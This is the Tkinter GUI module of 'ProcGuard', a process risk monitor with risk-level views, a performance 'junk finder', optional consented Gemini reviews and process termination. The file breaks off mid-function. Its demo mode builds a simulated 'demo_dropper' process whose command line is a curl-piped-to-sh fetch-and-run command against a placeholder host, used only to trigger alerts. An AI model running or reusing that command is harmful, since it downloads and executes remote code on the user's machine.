"""Tkinter GUI. Tkinter ships with Python on Windows/macOS/Linux, so the only
hard dependency of the whole project is psutil."""
from __future__ import annotations

from pathlib import Path
import queue
import sys
import threading
import time
import tkinter as tk
from tkinter import font as tkfont
from tkinter import messagebox, ttk
from typing import Dict, List, Optional

import psutil

from .ai_analyzer import AIReviewer, AIVerdict, ai_key, default_analyzer
from .alerts import AlertManager, notify
from .collector import Collector
from .models import Assessed, Level
from .performance import PerformanceEngine, protection_reason
from .performance_ai import PerformanceReviewer, PerformanceVerdict, LABELS, performance_key
from .risk_engine import RiskEngine, is_external, trust_key
from .storage import load_trusted, save_trusted
from .util import fmt_age, fmt_bytes, fmt_time

# level -> (row text colour, row background, label, strong bg, strong fg)
PALETTE = {
    "bg": "#0b1220", "panel": "#111c2e", "raised": "#19283e",
    "line": "#2a3b53", "text": "#e6edf6", "muted": "#a2b2c9",
    "accent": "#38d6bf", "selected": "#244969",
}
STYLE = {
    Level.HIGH: ("#ffadb4", "#30202d", "HIGH RISK", "#e45b70", "#101725"),
    Level.MEDIUM: ("#f8d18a", "#302b26", "MEDIUM RISK", "#edbc65", "#101725"),
    Level.LOW: ("#a1dfca", "#152b30", "LOW RISK", "#62d4b0", "#101725"),
}
GROUP = {Level.HIGH: "grp_high", Level.MEDIUM: "grp_medium", Level.LOW: "grp_low"}
VERDICT_COLOURS = {"benign": "#12b76a", "suspicious": "#f79009", "malicious": "#d92d20",
                   "unknown": PALETTE["muted"], "error": PALETTE["muted"]}

COLUMNS = (  # id, heading, width, anchor
    ("pid", "PID", 70, "e"),
    ("cpu", "CPU %", 70, "e"),
    ("mem", "Memory", 90, "e"),
    ("score", "Score", 60, "e"),
    ("user", "User", 120, "w"),
    ("reason", "Main reason", 520, "w"),
)
SORTERS = {
    "#0": lambda a: a.info.name.lower(),
    "pid": lambda a: a.info.pid,
    "cpu": lambda a: a.info.cpu_percent,
    "mem": lambda a: a.info.mem_rss,
    "score": lambda a: a.risk.score,
    "user": lambda a: (a.info.username or "").lower(),
}
INTERVALS = {"1 s": 1.0, "2 s": 2.0, "5 s": 5.0, "10 s": 10.0}


class App(tk.Tk):
    def __init__(self, demo: bool = False) -> None:
        super().__init__()
        self.title("ProcGuard \u2014 process risk monitor")
        self.geometry("1440x880")
        self.minsize(1040, 680)

        # --- core objects
        self.trusted = load_trusted()
        self.engine = RiskEngine(self.trusted)
        if demo:
            self._enable_demo()
        self.collector = Collector()
        self.alert_mgr = AlertManager()
        self.analyzer = default_analyzer()
        self.reviewer = AIReviewer(self.analyzer, lambda k, v: self.q.put(("ai", k, v)))
        self.ai_results: Dict[str, object] = {}
        self._ai_consented = False
        self._performance_consented = False
        self.performance_results = {}
        self.performance_findings = {}
        try:
            current = psutil.Process()
            self._owner = current.username()
            ancestors = {p.pid for p in current.parents()}
        except psutil.Error:
            self._owner, ancestors = "", set()
        self.performance_engine = PerformanceEngine(self._own_pid(), self._owner, ancestors)
        self.performance_reviewer = PerformanceReviewer(
            self.analyzer, lambda key, result: self.q.put(("performance_ai", key, result)))

        # --- state shared with the worker thread
        self.q: "queue.Queue" = queue.Queue()
        self._wake = threading.Event()
        self._stop = threading.Event()
        self._paused = False
        self._interval = 2.0

        # --- UI state
        self.items: Dict[int, Assessed] = {}
        self._sort = ("score", True)
        self._last_sig = ""
        self._last_pid: Optional[int] = None
        self._banner_pid: Optional[int] = None
        self._level_filter: Optional[Level] = None
        self._alert_count = 0
        self._last_update = "Waiting for first scan"
        self._demo = demo

        self._build_fonts_and_style()
        self._build_ui()
        self.protocol("WM_DELETE_WINDOW", self._on_close)

        threading.Thread(target=self._worker, daemon=True).start()
        self.after(200, self._poll)

    # ================================================================== setup
    def _build_fonts_and_style(self) -> None:
        self.configure(bg=PALETTE["bg"])
        base = tkfont.nametofont("TkDefaultFont")
        base.configure(size=11)
        self.f_base = base
        self.f_bold = base.copy()
        self.f_bold.configure(weight="bold")
        self.f_big = base.copy()
        self.f_big.configure(weight="bold", size=19)
        self.f_metric = base.copy()
        self.f_metric.configure(weight="bold", size=25)
        self.f_mono = tkfont.nametofont("TkFixedFont").copy()
        self.f_mono.configure(size=10)
        style = ttk.Style(self)
        # Clam lets ttk honour the same palette on every supported platform.
        if "clam" in style.theme_names():
            style.theme_use("clam")
        style.configure(".", background=PALETTE["bg"], foreground=PALETTE["text"],
                        font=self.f_base)
        style.configure("TFrame", background=PALETTE["bg"])
        style.configure("Panel.TFrame", background=PALETTE["panel"])
        style.configure("TLabel", background=PALETTE["bg"], foreground=PALETTE["text"])
        style.configure("Muted.TLabel", foreground=PALETTE["muted"])
        style.configure("TButton", background=PALETTE["raised"], bordercolor=PALETTE["line"],
                        padding=(12, 9), relief="flat")
        style.map("TButton", background=[("active", "#29415c"), ("pressed", "#244969")],
                  foreground=[("disabled", "#718199")])
        style.configure("Accent.TButton", background=PALETTE["accent"], foreground="#092425")
        style.map("Accent.TButton", background=[("active", "#79ead9")],
                  foreground=[("disabled", "#718199")])
        style.configure("Danger.TButton", foreground="#ffadb4")
        style.configure("Filter.TButton", padding=(10, 6))
        style.configure("Active.Filter.TButton", background=PALETTE["selected"],
                        foreground=PALETTE["accent"])
        style.configure("TCheckbutton", padding=(4, 5))
        style.map("TCheckbutton", background=[("active", PALETTE["bg"])],
                  foreground=[("disabled", "#718199")])
        style.configure("TEntry", fieldbackground=PALETTE["panel"],
                        foreground=PALETTE["text"], insertcolor=PALETTE["accent"], padding=9)
        style.configure("TCombobox", fieldbackground=PALETTE["panel"],
                        arrowcolor=PALETTE["text"], padding=6)
        style.map("TCombobox", fieldbackground=[("readonly", PALETTE["panel"])],
                  foreground=[("readonly", PALETTE["text"])],
                  selectbackground=[("readonly", PALETTE["selected"])],
                  selectforeground=[("readonly", PALETTE["text"])])
        self.option_add("*TCombobox*Listbox.background", PALETTE["panel"])
        self.option_add("*TCombobox*Listbox.foreground", PALETTE["text"])
        style.configure("Treeview", rowheight=34, background=PALETTE["panel"],
                        fieldbackground=PALETTE["panel"], foreground=PALETTE["text"],
                        borderwidth=0)
        style.configure("Treeview.Heading", background=PALETTE["raised"],
                        foreground=PALETTE["muted"], font=self.f_bold, padding=(8, 10),
                        relief="flat")
        style.map("Treeview", background=[("selected", PALETTE["selected"])],
                  foreground=[("selected", "#ffffff")])
        style.map("Treeview.Heading", background=[("active", "#29415c")])
        style.configure("TNotebook", background=PALETTE["bg"], borderwidth=0)
        style.configure("TNotebook.Tab", padding=(14, 10), background=PALETTE["raised"])
        style.map("TNotebook.Tab", background=[("selected", PALETTE["panel"])],
                  foreground=[("selected", PALETTE["accent"])])
        style.configure("TPanedwindow", background=PALETTE["bg"])
        style.configure("Vertical.TScrollbar", background=PALETTE["raised"],
                        troughcolor=PALETTE["panel"], arrowcolor=PALETTE["muted"])
        style.configure("Horizontal.TScrollbar", background=PALETTE["raised"],
                        troughcolor=PALETTE["panel"], arrowcolor=PALETTE["muted"])
        icon_path = Path(__file__).with_name("assets") / "ProcGuard_icon.png"
        if icon_path.is_file():
            try:
                self._icon = tk.PhotoImage(file=str(icon_path))
                self.iconphoto(True, self._icon)
            except tk.TclError:
                pass

    def _build_ui(self) -> None:
        self.topbar = ttk.Frame(self, padding=(22, 18, 22, 10))
        self.topbar.pack(fill="x")
        brand = ttk.Frame(self.topbar)
        brand.pack(side="left")
        ttk.Label(brand, text="ProcGuard", font=self.f_big).pack(anchor="w")
        subtitle = "Process intelligence  /  Live risk monitoring"
        if self._demo:
            subtitle += "  /  DEMO ALERTS"
        ttk.Label(brand, text=subtitle, style="Muted.TLabel").pack(anchor="w", pady=(4, 0))
        self.monitor_label = tk.Label(self.topbar, text="STARTING", font=self.f_bold,
                                     bg=PALETTE["raised"], fg=PALETTE["accent"], padx=14, pady=8)
        self.monitor_label.pack(side="right")

        self.summary = ttk.Frame(self, padding=(22, 6, 22, 14))
        self.summary.pack(fill="x")
        self.badges: Dict[Level, tk.Label] = {}
        self.total_label = self._summary_card(self.summary, 0, "PROCESSES", PALETTE["text"],
                                             "Visible to this monitor", lambda: self._set_filter(None))
        for col, lvl in enumerate((Level.HIGH, Level.MEDIUM, Level.LOW), 1):
            hints = {Level.HIGH: "Review these first", Level.MEDIUM: "Worth a closer look",
                     Level.LOW: "Lower heuristic scores"}
            self.badges[lvl] = self._summary_card(self.summary, col, STYLE[lvl][2], STYLE[lvl][3],
                                                 hints[lvl], lambda level=lvl: self._set_filter(level))

        controls = ttk.Frame(self, padding=(22, 0, 22, 8))
        controls.pack(fill="x")
        ttk.Label(controls, text="Search processes", style="Muted.TLabel").pack(side="left", padx=(0, 8))
        self.search_var = tk.StringVar()
        self.search_entry = ttk.Entry(controls, textvariable=self.search_var, width=26)
        self.search_entry.pack(side="left", fill="x", expand=True)
        ttk.Button(controls, text="Clear", command=self._clear_search).pack(side="left", padx=(6, 16))
        ttk.Label(controls, text="Refresh", style="Muted.TLabel").pack(side="left", padx=(0, 6))
        self.interval_box = ttk.Combobox(controls, values=list(INTERVALS), width=5, state="readonly")
        self.interval_box.set("2 s")
        self.interval_box.bind("<<ComboboxSelected>>", self._on_interval)
        self.interval_box.pack(side="left", padx=(0, 6))
        self.pause_var = tk.BooleanVar(value=False)
        self.pause_button = ttk.Button(controls, text="Pause", command=self._toggle_pause)
        self.pause_button.pack(side="left", padx=6)
        ttk.Button(controls, text="Refresh now", command=self._wake.set,
                   style="Accent.TButton").pack(side="left", padx=(0, 0))

        options = ttk.Frame(self, padding=(22, 0, 22, 12))
        options.pack(fill="x")
        self.filter_buttons = {}
        for level, label in ((None, "All processes"), (Level.HIGH, "High risk"),
                             (Level.MEDIUM, "Medium risk"), (Level.LOW, "Low risk")):
            button = ttk.Button(options, text=label, style="Filter.TButton",
                                command=lambda level=level: self._set_filter(level))
            button.pack(side="left", padx=(0, 5))
            self.filter_buttons[level] = button
        self.alerts_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options, text="Alerts", variable=self.alerts_var).pack(side="right")
        self.auto_ai = tk.BooleanVar(value=False)
        self.ai_check = ttk.Checkbutton(options, text="AI auto-review", variable=self.auto_ai,
                                        command=self._on_auto_ai)
        self.ai_check.pack(side="right", padx=10)
        if not self.analyzer.available():
            self.ai_check.state(["disabled"])

        self.banner = tk.Frame(self, bg="#412335")
        self.banner_label = tk.Label(self.banner, text="", bg="#412335", fg="#ffbdc6",
                                     font=self.f_bold, anchor="w", justify="left", cursor="hand2")
        self.banner_label.pack(side="left", fill="x", expand=True, padx=22, pady=10)
        self.banner_label.bind("<Button-1>", lambda _e: self._focus_pid(self._banner_pid))
        self.banner.bind("<Configure>", lambda e: self.banner_label.configure(wraplength=max(200, e.width - 150)))
        tk.Button(self.banner, text="Dismiss", command=self.banner.pack_forget, bg="#412335",
                  fg="#ffbdc6", activebackground="#573147", activeforeground="white", relief="flat",
                  borderwidth=0, highlightthickness=0).pack(side="right", padx=18)

        self.status = ttk.Label(self, text="Starting…", padding=(22, 10), anchor="w", style="Muted.TLabel")
        self.status.pack(side="bottom", fill="x")
        self.workspace = ttk.Notebook(self)
        self.workspace.pack(fill="both", expand=True, padx=22, pady=(8, 0))
        self.monitor_page = ttk.Frame(self.workspace)
        self.workspace.add(self.monitor_page, text="Security monitor")
        self.paned = ttk.PanedWindow(self.monitor_page, orient="horizontal")
        self.paned.pack(fill="both", expand=True)
        self.process_panel = ttk.Frame(self.paned, style="Panel.TFrame")
        self.paned.add(self.process_panel, weight=3)
        table_header = ttk.Frame(self.process_panel, padding=(12, 10), style="Panel.TFrame")
        table_header.pack(fill="x")
        tk.Label(table_header, text="Process activity", font=self.f_bold, bg=PALETTE["panel"],
                 fg=PALETTE["text"]).pack(side="left")
        self.result_label = tk.Label(table_header, text="Waiting for scan", bg=PALETTE["panel"],
                                     fg=PALETTE["muted"])
        self.result_label.pack(side="right")
        tree_frame = ttk.Frame(self.process_panel, style="Panel.TFrame")
        tree_frame.pack(fill="both", expand=True)
        tree_frame.rowconfigure(0, weight=1)
        tree_frame.columnconfigure(0, weight=1)
        self.tree = ttk.Treeview(tree_frame, columns=[c[0] for c in COLUMNS], selectmode="browse")
        vs = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        hs = ttk.Scrollbar(tree_frame, orient="horizontal", command=self.tree.xview)
        self.tree.configure(yscrollcommand=vs.set, xscrollcommand=hs.set)
        self.tree.grid(row=0, column=0, sticky="nsew")
        vs.grid(row=0, column=1, sticky="ns")
        hs.grid(row=1, column=0, sticky="ew")
        self.tree.column("#0", width=245, minwidth=180, anchor="w", stretch=False)
        self._set_headings()
        widths = {"pid": 65, "cpu": 65, "mem": 88, "score": 65, "user": 100, "reason": 260}
        for cid, _h, _width, anchor in COLUMNS:
            self.tree.column(cid, width=widths[cid], minwidth=widths[cid], anchor=anchor,
                             stretch=(cid == "reason"))
        for lvl, st in STYLE.items():
            self.tree.tag_configure(lvl.value, foreground=st[0], background=st[1])
            self.tree.tag_configure("g_" + lvl.value, foreground=st[3], background=PALETTE["raised"],
                                    font=self.f_bold)
            self.tree.insert("", "end", iid=GROUP[lvl], text=st[2], open=(lvl is not Level.LOW),
                             tags=("g_" + lvl.value,))
        self.tree.bind("<<TreeviewSelect>>", lambda _e: self._show_inspector())
        self.empty_label = tk.Label(tree_frame, text="", bg=PALETTE["panel"], fg=PALETTE["muted"],
                                    font=self.f_base, padx=15, pady=20, justify="center")
        self.inspector_panel = ttk.Frame(self.paned, style="Panel.TFrame")
        self.paned.add(self.inspector_panel, weight=2)
        self.nb = ttk.Notebook(self.inspector_panel)
        self.nb.pack(fill="both", expand=True)
        insp = ttk.Frame(self.nb, style="Panel.TFrame")
        self.nb.add(insp, text="Process inspector")
        bar = ttk.Frame(insp, padding=10, style="Panel.TFrame")
        bar.pack(fill="x")
        self.btn_ai = ttk.Button(bar, text="Ask AI", command=self._ask_ai, style="Accent.TButton")
        self.btn_ai.pack(side="left")
        self.btn_trust = ttk.Button(bar, text="Mark as trusted", command=self._toggle_trust)
        self.btn_trust.pack(side="left", padx=(6, 0))
        danger_bar = ttk.Frame(insp, padding=(10, 0, 10, 10), style="Panel.TFrame")
        danger_bar.pack(fill="x")
        self.btn_kill = ttk.Button(danger_bar, text="Terminate process…", command=self._terminate,
                                   style="Danger.TButton")
        self.btn_kill.pack(side="left")
        self.detail = self._text_pane(insp, 15)
        self._configure_detail_tags()
        logf = ttk.Frame(self.nb, style="Panel.TFrame")
        self.nb.add(logf, text="Alert log · 0")
        self.log = self._text_pane(logf, 15)
        self.log.tag_configure("time", foreground=PALETTE["muted"])
        self.log.tag_configure("alert", font=self.f_bold, foreground=STYLE[Level.HIGH][0])
        self._build_junk_finder()
        self.search_var.trace_add("write", lambda *_: self._apply_tree())
        self.bind("<Control-f>", self._focus_search)
        self.bind("<Command-f>", self._focus_search)
        self.bind("<Escape>", lambda _e: self._clear_search())
        self.after_idle(self._position_sash)
        self._set_filter(None)
        self._show_inspector(force=True)

    def _build_junk_finder(self):
        page = ttk.Frame(self.workspace)
        self.workspace.add(page, text="Junk finder")
        header = ttk.Frame(page, padding=(14, 12))
        header.pack(fill="x")
        ttk.Label(header, text="Find what is slowing you down", font=self.f_big).pack(anchor="w")
        intro = ttk.Label(header, text="Review CPU and memory use, then decide what you can close. High usage can be useful work; it does not prove an app is junk.",
                          style="Muted.TLabel", wraplength=1000)
        intro.pack(anchor="w", pady=(4, 0))
        header.bind("<Configure>", lambda e: intro.configure(wraplength=max(300, e.width - 30)))
        self.junk_summary = ttk.Label(page, text="Collecting process measurements…", padding=(14, 6))
        self.junk_summary.pack(fill="x")
        controls = ttk.Frame(page, padding=(14, 6))
        controls.pack(fill="x")
        self.junk_all = tk.BooleanVar(value=False)
        ttk.Checkbutton(controls, text="Show all processes", variable=self.junk_all,
                        command=self._apply_junk_tree).pack(side="left")
        ttk.Label(controls, text="Sort by", style="Muted.TLabel").pack(side="left", padx=(20, 6))
        self.junk_sort = ttk.Combobox(controls, values=("Impact", "CPU", "Memory"), state="readonly", width=9)
        self.junk_sort.set("Impact")
        self.junk_sort.bind("<<ComboboxSelected>>", lambda _e: self._apply_junk_tree())
        self.junk_sort.pack(side="left")
        self.junk_batch = ttk.Button(controls, text="Gemini: review top 5", command=self._review_junk_batch)
        self.junk_batch.pack(side="right")
        self.junk_ask = ttk.Button(controls, text="Gemini: review selected", command=self._review_junk_selected,
                                   style="Accent.TButton")
        self.junk_ask.pack(side="right", padx=8)
        self.junk_notice = ttk.Label(page, text="Let a few scans finish to measure sustained CPU use.",
                                     style="Muted.TLabel", padding=(14, 4), wraplength=970)
        self.junk_notice.pack(fill="x")
        split = ttk.PanedWindow(page, orient="vertical")
        split.pack(fill="both", expand=True, padx=14, pady=(6, 12))
        table = ttk.Frame(split, style="Panel.TFrame")
        table.rowconfigure(0, weight=1)
        table.columnconfigure(0, weight=1)
        columns = ("pid", "cpu", "avg", "memory", "impact", "local", "gemini")
        self.junk_tree = ttk.Treeview(table, columns=columns, selectmode="browse", height=7)
        self.junk_tree.heading("#0", text="Process")
        self.junk_tree.column("#0", width=230, minwidth=180, stretch=True)
        for col, title, width in (("pid", "PID", 65), ("cpu", "CPU now", 80), ("avg", "Avg CPU", 80),
                                  ("memory", "Memory", 95), ("impact", "Measured impact", 160),
                                  ("local", "Local guidance", 150), ("gemini", "Gemini opinion", 165)):
            self.junk_tree.heading(col, text=title)
            self.junk_tree.column(col, width=width, minwidth=width, stretch=False,
                                  anchor="e" if col in ("pid", "cpu", "avg", "memory") else "w")
        self.junk_tree.tag_configure("protected", foreground=PALETTE["muted"])
        self.junk_tree.tag_configure("review", foreground=STYLE[Level.MEDIUM][0])
        self.junk_tree.bind("<<TreeviewSelect>>", lambda _e: self._show_junk_detail())
        vs = ttk.Scrollbar(table, orient="vertical", command=self.junk_tree.yview)
        hs = ttk.Scrollbar(table, orient="horizontal", command=self.junk_tree.xview)
        self.junk_tree.configure(yscrollcommand=vs.set, xscrollcommand=hs.set)
        self.junk_tree.grid(row=0, column=0, sticky="nsew")
        vs.grid(row=0, column=1, sticky="ns")
        hs.grid(row=1, column=0, sticky="ew")
        self.junk_empty = tk.Label(table, text="Collecting measurements…", bg=PALETTE["panel"],
                                   fg=PALETTE["muted"], padx=16, pady=15, justify="center")
        split.add(table, weight=3)
        detail_panel = ttk.Frame(split, style="Panel.TFrame")
        bar = ttk.Frame(detail_panel, style="Panel.TFrame", padding=(10, 8))
        bar.pack(fill="x")
        tk.Label(bar, text="Why review this process?", font=self.f_bold,
                 bg=PALETTE["panel"], fg=PALETTE["text"]).pack(side="left")
        self.junk_kill = ttk.Button(bar, text="Terminate selected…", command=self._terminate_junk,
                                    style="Danger.TButton")
        self.junk_kill.pack(side="right")
        self.junk_detail = self._text_pane(detail_panel, 7)
        self.junk_detail.tag_configure("h1", font=self.f_big, spacing3=6)
        self.junk_detail.tag_configure("h2", font=self.f_bold, spacing1=10, spacing3=4)
        self.junk_detail.tag_configure("muted", foreground=PALETTE["muted"])
        split.add(detail_panel, weight=2)
        self._junk_visible_keys = {}
        self._junk_last_sig = ""
        self._junk_last_key = None
        self.search_var.trace_add("write", lambda *_: self._apply_junk_tree())
        self._apply_junk_tree()

    def _junk_rows(self):
        query = self.search_var.get().strip().casefold()
        rows = [f for f in self.performance_findings.values()
                if (self.junk_all.get() or f.flagged)
                and (not query or query in f"{f.info.name} {f.info.pid} {f.info.exe or ''} {f.info.username or ''} {f.info.cmd}".casefold())]
        sort = self.junk_sort.get()
        if sort == "CPU":
            return sorted(rows, key=lambda f: (f.average_cpu, f.info.cpu_percent), reverse=True)
        if sort == "Memory":
            return sorted(rows, key=lambda f: f.info.mem_rss, reverse=True)
        return sorted(rows, key=lambda f: (f.flagged, not f.protected, f.rank), reverse=True)

    def _apply_junk_tree(self):
        rows = self._junk_rows()
        keep = set()
        for index, f in enumerate(rows):
            i = f.info
            iid = f"j{i.pid}"
            keep.add(iid)
            if self.junk_tree.exists(iid) and self._junk_visible_keys.get(iid) != i.key:
                self.junk_tree.delete(iid)  # recycled PID must lose the old selection
            result = self.performance_results.get(performance_key(f))
            opinion = "Queued…" if result == "pending" else (LABELS.get(result.recommendation, "Review first") if isinstance(result, PerformanceVerdict) else "Not reviewed")
            if f.protected:
                opinion = "Protected locally"
            average = f"{f.average_cpu:.1f}%" if f.samples >= 3 and f.sample_seconds >= 4 else "Measuring…"
            values = (i.pid, f"{i.cpu_percent:.1f}%", average, fmt_bytes(i.mem_rss), f.impact,
                      "Keep / protected" if f.protected else "Review before closing", opinion)
            tags = ("protected",) if f.protected else ("review",) if f.flagged else ()
            if self.junk_tree.exists(iid):
                self.junk_tree.item(iid, text=i.name, values=values, tags=tags)
                self.junk_tree.move(iid, "", index)
            else:
                self.junk_tree.insert("", index, iid=iid, text=i.name, values=values, tags=tags)
        for iid in self.junk_tree.get_children():
            if iid not in keep:
                self.junk_tree.delete(iid)
        self._junk_visible_keys = {f"j{f.info.pid}": f.info.key for f in rows}
        flagged = [f for f in self.performance_findings.values() if f.flagged]
        reviewable = sum(not f.protected for f in flagged)
        self.junk_summary.config(text=f"{len(rows)} shown  ·  {reviewable} resource-heavy candidates to review  ·  {len(flagged) - reviewable} protected heavy entries")
        if not rows:
            self.junk_empty.config(text="No matches for this search." if self.search_var.get().strip() else
                "No resource-heavy candidates yet.\nKeep monitoring or enable ‘Show all processes’. CPU needs at least three scans over four seconds.")
            self.junk_empty.place(relx=0.5, rely=0.5, anchor="center")
        else:
            self.junk_empty.place_forget()
        available = self.analyzer.available() and callable(getattr(self.analyzer, "analyze_performance", None))
        batch = any(f.flagged and not f.protected for f in rows)
        self.junk_batch.state(["!disabled"] if available and batch else ["disabled"])
        self._show_junk_detail()

    def _selected_junk(self):
        selected = self.junk_tree.selection()
        if not selected:
            return None
        iid = selected[0]
        try:
            finding = self.performance_findings.get(int(iid[1:]))
        except ValueError:
            return None
        return finding if finding and self._junk_visible_keys.get(iid) == finding.info.key else None

    def _show_junk_detail(self):
        f = self._selected_junk()
        available = self.analyzer.available() and callable(getattr(self.analyzer, "analyze_performance", None))
        result = self.performance_results.get(performance_key(f)) if f else None
        self.junk_ask.state(["!disabled"] if available and f and result != "pending" else ["disabled"])
        self.junk_kill.state(["!disabled"] if f and f.can_terminate else ["disabled"])
        segments = []
        if f is None:
            segments.append(("Select a process to see measured impact, local guidance, and an optional Gemini opinion.\n", "muted"))
        else:
            i = f.info
            segments.extend([(f"{i.name}  ·  PID {i.pid}\n", "h1"), ("Measured performance\n", "h2")])
            segments.append((f"CPU now: {i.cpu_percent:.1f}% of the machine. Recent average: {f.average_cpu:.1f}% across {f.samples} scan(s), {f.sample_seconds:.0f}s.\nMemory: {fmt_bytes(i.mem_rss)} RSS ({i.mem_percent:.1f}% of RAM).\n", ""))
            if f.samples < 3 or f.sample_seconds < 4:
                segments.append(("Still gathering CPU samples; a brief spike is not evidence of sustained load.\n", "muted"))
            segments.extend((reason + "\n", "") for reason in f.reasons)
            segments.extend([("Local guidance\n", "h2"), (f.advice + "\n", "")])
            segments.extend([("Gemini performance opinion\n", "h2")])
            if result == "pending":
                segments.append(("Queued for review. Requests run in the background, at least six seconds apart.\n", "muted"))
            elif isinstance(result, PerformanceVerdict):
                segments.append((LABELS[result.recommendation] + "\n", "h2"))
                segments.append((result.explanation + "\n" + result.caution + "\n", ""))
                if f.protected:
                    segments.append(("Local protection overrides AI advice. Termination stays disabled.\n", "muted"))
            else:
                segments.append(("Review this measurement snapshot with Gemini. Advice resets when identity or resource use changes materially.\n", "muted"))
        if not available:
            segments.append(("Gemini is not configured. Install google-genai and set GEMINI_API_KEY before launching. Local analysis still works.\n", "muted"))
        segments.append(("\nRSS includes shared memory, so closing apps may free less RAM than shown. These measurements do not cover disk speed, thermal throttling, or all causes of slowness.\n", "muted"))
        sig = repr(segments)
        key = f.info.key if f else None
        if sig != self._junk_last_sig:
            y = self.junk_detail.yview()[0] if key == self._junk_last_key else 0
            self.junk_detail.config(state="normal")
            self.junk_detail.delete("1.0", "end")
            for text, tag in segments:
                self.junk_detail.insert("end", text, tag)
            self.junk_detail.config(state="disabled")
            self.junk_detail.yview_moveto(y)
            self._junk_last_sig, self._junk_last_key = sig, key

    def _confirm_performance_ai(self):
        if self._performance_consented:
            return True
        self._performance_consented = bool(messagebox.askokcancel(
            "Send a performance summary to Gemini?",
            "Gemini receives the process and parent names, operating-system type, CPU/RAM measurements, "
            "and local protection status for the selected process (or up to five candidates). Names are "
            "redacted where possible. Paths, command lines, usernames, PIDs, IP addresses, and file contents "
            "are omitted. Names may still identify apps you use.\n\n"
            "Requests use your API key and may incur charges. This consent applies to performance reviews "
            "for this session. Advice never terminates processes automatically. Continue?"))
        return self._performance_consented

    def _queue_performance_review(self, finding):
        key = performance_key(finding)
        if self.performance_results.get(key) == "pending":
            return False
        if self.performance_reviewer.submit(finding):
            self.performance_results[key] = "pending"
            return True
        return False

    def _review_junk_selected(self):
        f = self._selected_junk()
        if f is None or not self._confirm_performance_ai():
            return
        sent = self._queue_performance_review(f)
        self.junk_notice.config(text="Gemini review queued." if sent else "Could not queue review. Check Gemini setup or wait for the current requests.")
        self._apply_junk_tree()

    def _review_junk_batch(self):
        targets = [f for f in self._junk_rows() if f.flagged and not f.protected
                   and not isinstance(self.performance_results.get(performance_key(f)), PerformanceVerdict)
                   and self.performance_results.get(performance_key(f)) != "pending"][:5]
        if not targets:
            self.junk_notice.config(text="No new candidates to review. Select a row to retry a previous opinion.")
            return
        if not self._confirm_performance_ai():
            return
        count = sum(self._queue_performance_review(f) for f in targets)
        self.junk_notice.config(text=f"Queued {count} Gemini review(s). No automatic follow-up requests will be sent.")
        self._apply_junk_tree()

    def _summary_card(self, parent, column, title, colour, hint, command):
        parent.columnconfigure(column, weight=1, uniform="cards")
        card = tk.Frame(parent, bg=PALETTE["panel"], highlightbackground=PALETTE["line"],
                        highlightthickness=1, cursor="hand2")
        card.grid(row=0, column=column, sticky="nsew", padx=(0 if column == 0 else 6, 0))
        stripe = tk.Frame(card, bg=colour, height=3)
        stripe.pack(fill="x")
        title_label = tk.Label(card, text=title, font=self.f_bold, bg=PALETTE["panel"],
                              fg=PALETTE["muted"], anchor="w")
        title_label.pack(fill="x", padx=14, pady=(12, 0))
        value = tk.Label(card, text="—", font=self.f_metric, bg=PALETTE["panel"], fg=colour, anchor="w")
        value.pack(fill="x", padx=14, pady=(2, 0))
        hint_label = tk.Label(card, text=hint, bg=PALETTE["panel"], fg=PALETTE["muted"], anchor="w")
        hint_label.pack(fill="x", padx=14, pady=(0, 12))
        for widget in (card, stripe, title_label, value, hint_label):
            widget.bind("<Button-1>", lambda _e: command())
        return value

    def _text_pane(self, parent, height):
        body = ttk.Frame(parent, style="Panel.TFrame")
        body.pack(fill="both", expand=True)
        text = tk.Text(body, wrap="word", padx=18, pady=14, borderwidth=0, highlightthickness=0,
                       state="disabled", height=height, font=self.f_base, spacing1=2, spacing3=4,
                       background=PALETTE["panel"], foreground=PALETTE["text"],
                       selectbackground=PALETTE["selected"], selectforeground="white",
                       insertbackground=PALETTE["accent"])
        scroll = ttk.Scrollbar(body, orient="vertical", command=text.yview)
        text.configure(yscrollcommand=scroll.set)
        text.pack(side="left", fill="both", expand=True)
        scroll.pack(side="right", fill="y")
        return text

    def _position_sash(self):
        self.paned.sashpos(0, int(self.paned.winfo_width() * 0.61))

    def _focus_search(self, _event=None):
        self.search_entry.focus_set()
        self.search_entry.selection_range(0, "end")
        return "break"

    def _clear_search(self):
        self.search_var.set("")

    def _set_filter(self, level):
        self._level_filter = level
        self.workspace.select(0)
        for candidate, button in self.filter_buttons.items():
            button.configure(style="Active.Filter.TButton" if candidate == level else "Filter.TButton")
        self._apply_tree()
        self._show_inspector()

    def _toggle_pause(self):
        self.pause_var.set(not self.pause_var.get())
        self._on_pause()

    def _configure_detail_tags(self) -> None:
        t = self.detail
        t.tag_configure("h1", font=self.f_big)
        t.tag_configure("h2", font=self.f_bold, spacing1=10, spacing3=2)
        t.tag_configure("muted", foreground=PALETTE["muted"])
        t.tag_configure("pts", font=self.f_mono, foreground=STYLE[Level.HIGH][0])
        t.tag_configure("body", lmargin1=0, lmargin2=0)
        t.tag_configure("mono", font=self.f_mono)
        for lvl, st in STYLE.items():
            t.tag_configure(lvl.value, font=self.f_bold, background=st[3], foreground=st[4])
        for v, colour in VERDICT_COLOURS.items():
            t.tag_configure("v_" + v, font=self.f_bold, foreground=colour)

    def _set_headings(self) -> None:
        col, rev = self._sort
        arrow = " \u25BC" if rev else " \u25B2"
        self.tree.heading("#0", text="Process" + (arrow if col == "#0" else ""),
                          command=lambda: self._sort_by("#0"))
        for cid, head, _w, _a in COLUMNS:
            if cid in SORTERS:
                self.tree.heading(cid, text=head + (arrow if col == cid else ""),
                                  command=lambda c=cid: self._sort_by(c))
            else:
                self.tree.heading(cid, text=head)

    def _enable_demo(self) -> None:
        """--demo-alerts: after two normal scans, a SIMULATED high-risk process appears so you can
        see the banner, alert log and notification. It is not a real process and runs nothing."""
        from .models import ProcessInfo

        orig = self.engine.assess_all
        started = time.time()  # fixed start time = stable identity, so it alerts exactly once
        scans = {"n": 0}

        def wrapped(infos):
            scans["n"] += 1
            out = orig(infos)
            if scans["n"] >= 3:
                fake = ProcessInfo(
                    pid=999001, ppid=1, name="demo_dropper (simulated)",
                    exe="/tmp/demo/demo_dropper",
                    cmdline=["sh", "-c", "curl http://example.invalid/payload.sh | sh"],
                    username="demo", create_time=started, status="running", num_threads=2, simulated=True,
                    cpu_percent=5.0, mem_percent=0.5, mem_rss=40_000_000, parent_name="demo")
                busy = ProcessInfo(
                    pid=999002, ppid=1, name="demo_browser_helper (simulated)",
